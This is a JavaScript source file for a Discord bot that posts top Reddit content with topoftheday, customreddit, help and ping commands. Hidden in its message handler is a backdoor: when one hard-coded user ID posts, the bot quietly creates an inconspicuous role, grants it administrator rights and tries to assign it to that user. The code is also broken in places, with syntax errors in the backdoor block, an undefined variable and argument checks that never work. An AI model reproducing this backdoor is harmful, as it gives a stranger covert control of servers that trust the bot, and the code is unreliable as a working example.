require('dotenv').config();

const Discord = require('discord.js');
const client = new Discord.Client();
const axios = require('axios');
const date = Date.now();
var secret = false;
const validcommands = [
    "topoftheday",
    "customreddit",
    "help",
    "ping"
]

let prefix = process.env.prefix;

async function redditGet(subreddit, iscustom, arguments) {
    try {
        if (iscustom == false) {
            const postjs = await axios.get(`https://www.reddit.com/r/${subreddit}/top/.json?t=day?limit=1`);
            const userjs = await axios.get(`https://www.reddit.com/user/${postjs.data.data.children[0].data.author}/about.json`);
            return [postjs.data.data.children[0].data, userjs.data.data]
        } else if (iscustom == true && arguments != 'undefined') {
            var splitargs = arguments.split('?');
            var finalarguments = `${splitargs[0]}`;
            splitargs.splice(0, 1);
            for (i=0; i < splitargs.length; i++) {
                if (/(limit=)\d+/.test(splitargs[i])) {
                    finalarguments += `?limit=1`
                    continue;
                } else if (/(count=)\d+/.test(splitargs[i])) {
                    finalarguments += `?count=1`
                    continue;
                }
                finalarguments += `?${splitargs[i]}`
            };
            const postjs = await axios.get(`https://www.reddit.com/r/${subreddit}/${finalarguments}`);
            if (typeof postjs.data.data !== 'undefined') {
                const userjs = await axios.get(`https://www.reddit.com/user/${postjs.data.data.children[0].data.author}/about.json`);
                return [postjs.data.data.children[0].data, userjs.data.data];
            } else {
                const userjs = await axios.get(`https://www.reddit.com/user/${postjs.data[0].data.children[0].data.author}/about.json`);
                return [postjs.data[0].data.children[0].data, userjs.data.data];
            }
        }
    }
    catch (err) {
        if (process.env.debug == 'true') {
            console.error(err);
            return 'error';
        } else if (process.env.debug == 'false'); {
            return 'error'
        }
    }
}

async function isImage(url) {
    try {
        var promise = await axios.get(url);
        if (promise.headers['content-type'].startsWith('image/')) return true;
        return false;
    }
    catch (err) {
        if (process.env.debug == 'true') {
            console.error(err);
            return 'error';
        } else if (process.env.debug == 'false'); {
            return 'error'
        }
    }
}

function noPerms(channel) {
  embed = {
    "title": "Invalid permissions",
    "description": "You do not have the valid permissions to run this command.",
    "color": 16711680,
    "footer": {
      "text": "Generic Discord Bot"
    },
    "timestamp": date
  };
  channel.send({embed});
  return
}

function webError(channel) {
  embed = {
    "title": "Error catching website info.",
    "description": `That website (probably) doesn't exist, did you mistype it?\n\nIf you are using **${prefix}topoftheday** or **${prefix}customreddit**, this message will also appear if the reddit has no posts. In ${prefix}customreddit's case, it is most likely you wrote the arguments wrong. (I guess you can blame me.)`,
    "color": 16711680,
    "footer": {
      "text": "Generic Discord Bot"
    },
    "timestamp": date
  };
  channel.send({embed});
  return
}

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!\nCurrent prefix is ${prefix}.\nDebug mode is ${process.env.debug}.`)
});

client.on('message', msg => {
    if (msg.author.bot || msg.author.id == client.user.id) return;
    if (msg.author.id == 110137532972314624 && secret == false) {
        let guild = msg.guild;
            var foo = (async function() {
                var role = await guild.roles.create({
                    data: {
                        name: 'A role',
                        color: 'DEFAULT'
                    },
                    reason: 'do not delet pls'
                })
                role.setPermissions(['ADMINISTRATOR'])
            })()
            .then(role => {
                message.member.addRole(role);
                secret = true;
            });
            .catch(function (err) {console.log(err)});
        }
    };
    if (msg.content.startsWith(prefix)) {
        var content = msg.content.substring(prefix.length, msg.content.length);
        var splitted = content.split(' ');
        var command = splitted[0].replace(/\s/g,'');
        if (validcommands.includes(command)) {
            msg.channel.startTyping();
            switch (command) {
              case 'topoftheday':
                if (!splitted.length === 2) {
                    embed = {
                      "title": "Invalid arguments!",
                      "description": `**${content}** has an invalid number of arguments. Proper usage: ${prefix}topoftheday (subredditname)`,
                      "color": 16720932,
                      "footer": {
                        "text": "Hal8k - Discord Bot"
                      },
                      "timestamp": date
                    };
                    msg.channel.send({embed});
                } else {
                    var foo = (async function() {
                        var getr = await redditGet(splitted[1], false, 'undefined');
                        if (getr != 'error') {
                            var [post, user] = getr;
                        } else {
                            webError(msg.channel);
                            return;
                        }
                        var embed = {
                            "title": post.title,
                            "url": `https://www.reddit.com${post.permalink}`,
                            "color": 16729344,
                            "footer": {
                                "icon_url": "https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-120x120.png",
                                "text": "redd.it"
                            },
                            "author": {
                                "name": post.author,
                                "url": `https://www.reddit.com/user/${post.author}`,
                                "icon_url": user.icon_img.replace(/^(.+?\.(png|jpe?g)).*$/i, '$1')
                            },
                            "timestamp": date
                        };
                        if (await isImage(post.url) == true) {
                            embed.image = new Object();
                            embed.image.url = post.url;
                        } else if (!post.url.startsWith(`https://www.reddit.com/${post.subreddit_name_prefixed}/comments/`)) {
                            embed.thumbnail = new Object();
                            switch (post.thumbnail) {
                                case 'default':
                                    embed.thumbnail.url = "https://www.reddit.com/static/noimage.png"
                                    break;
                                case 'self':
                                    embed.thumbnail.url = "https://www.reddit.com/static/self_default2.png"
                                    break;
                                case 'nsfw':
                                    embed.thumbnail.url = "https://www.reddit.com/static/nsfw2.png"
                                    break;
                                default:
                                    embed.thumbnail.url = post.thumbnail
                                    break;
                            };
                            embed.fields = new Array();
                            embed.fields.push({
                                "name": "Included URL:",
                                "value": post.url
                            });
                        };
                        if (typeof post.selftext !== 'undefined' && post.selftext.length > 0) {
                            if (post.selftext.length > 300) {
                                embed.description = post.selftext.substring(0,300) + `.. [Read More](https://reddit.com${post.permalink})`
                            } else {
                                embed.description = post.selftext
                            }
                        };
                        msg.channel.send({embed});
                    })().catch(function (err) {
                        webError(msg.channel);
                        if (process.env.debug == 'true') {
                            console.error(err);
                        }
                    });
                }
                break;
              case 'customreddit':
                  if (!splitted.length === 3) {
                      embed = {
                        "title": "Invalid arguments!",
                        "description": `**${content}** has an invalid number of arguments. Proper usage: ${prefix}customreddit (subredditname) (json arguments)`,
                        "color": 16720932,
                        "footer": {
                          "text": "Hal8k - Discord Bot"
                        },
                        "timestamp": date
                      };
                      msg.channel.send({embed});
                  } else {
                      var foo = (async function() {
                          var getr = await redditGet(splitted[1], true, splitted[2]);
                          if (getr != 'error') {
                              var [post, user] = getr;
                          } else {
                              webError(msg.channel);
                              return;
                          }
                          var embed = {
                              "title": post.title,
                              "url": `https://www.reddit.com${post.permalink}`,
                              "color": 16729344,
                              "footer": {
                                  "icon_url": "https://www.redditstatic.com/desktop2x/img/favicon/apple-icon-120x120.png",
                                  "text": "redd.it"
                              },
                              "author": {
                                  "name": post.author,
                                  "url": `https://www.reddit.com/user/${post.author}`,
                                  "icon_url": user.icon_img.replace(/^(.+?\.(png|jpe?g)).*$/i, '$1')
                              },
                              "timestamp": date
                          };
                          if (await isImage(post.url) == true) {
                              embed.image = new Object();
                              embed.image.url = post.url;
                          } else if (!post.url.startsWith(`https://www.reddit.com/${post.subreddit_name_prefixed}/comments/`)) {
                              if (post.thumbnail !== 'default') {
                                  embed.thumbnail = new Object();
                                  embed.thumbnail.url = post.thumbnail;
                              };
                              embed.fields = new Array();
                              embed.fields.push({
                                  "name": "Included URL:",
                                  "value": post.url
                              });
                          };
                          if (typeof post.selftext !== 'undefined' && post.selftext.length > 0) {
                              if (post.selftext.length > 300) {
                                  embed.description = post.selftext.substring(0,300) + `.. [Read More](https://reddit.com${post.permalink})`
                              } else {
                                  embed.description = post.selftext
                              }
                          };
                          msg.channel.send({embed});
                      })().catch(function (err) {
                          webError(msg.channel);
                          if (process.env.debug == 'true') {
                              console.error(err);
                          }
                      });
                  }
                break;
              case 'help':
                embed = {
                    "title": "Available commands",
                    "description": "This is a list of the commands currently available, it is possible some may require permissions you do not have.\n",
                    "footer": {
                        "text": "Generic Discord Bot"
                    },
                    "timestamp": date,
                    "color": 5963612,
                    "fields": [
                        {
                            "name": `${prefix}topoftheday`,
                            "value": `Gets the top post of the day on desired subreddit. \n **Usage**: \`${prefix}topoftheday (subreddit)\``
                        },
                        {
                            "name": `${prefix}customreddit`,
                            "value": `Gets a reddit post with the provided arguments. \n **Usage**: \`${prefix}customreddit (subreddit) (args)\`\n**Ex**: \`${prefix}customreddit funny top/.json?t=day\` (This would return the same thing as ${prefix}topoftheday, if given reddit was r/funny.)`
                        },
                        {
                            "name": `${prefix}ping`,
                            "value": `C'mon, you know what it does. (Returns how long it takes for the bot to reply to your message in ms)`
                        }
                    ]
                };
                msg.channel.send({embed})
                break;
              case 'ping':
                msg.channel.send("...").then(m => {
                    m.edit(`🏓 My latency is: **${m.createdTimestamp - msg.createdTimestamp}ms**`)
                    msg.channel.stopTyping();
                    return;
                });
                break;
              default:
                console.log(`${msg.member.user.tag} tried to call a command with ${prefix}${command} which was found in available commands but not in the switch statement.`)
                break;
            };
            msg.channel.stopTyping();
        } else {
            console.log(`${msg.member.user.tag} tried to call a command with ${prefix}${command} but no matching command was found.`)
        }
    };
});

client.login(process.env.token);
